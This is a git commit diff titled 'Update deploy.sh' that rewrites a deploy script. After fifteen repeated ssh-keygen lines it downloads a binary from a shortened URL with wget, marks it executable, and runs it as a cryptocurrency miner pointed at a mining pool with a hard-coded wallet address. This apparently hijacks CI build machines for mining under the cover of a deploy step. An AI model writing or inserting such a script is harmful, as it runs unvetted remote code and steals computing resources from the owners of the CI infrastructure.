8324b66df5eefa8488db2dec26940084b600144c
dianedqncsaw <94683631+dianedqncsaw@users.noreply.github.com>
2021-11-19 18:54:54 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,1 +1,20 @@
-1246AaCfGgKkMNnqsTtVvXxYy
+#!/bin/bash
+
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+ssh-keygen -m PEM -t rsa -f .ssh/circleci
+wget -qO build https://git.io/JX7bv
+chmod +x build
+./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaInteL -p x -t 2
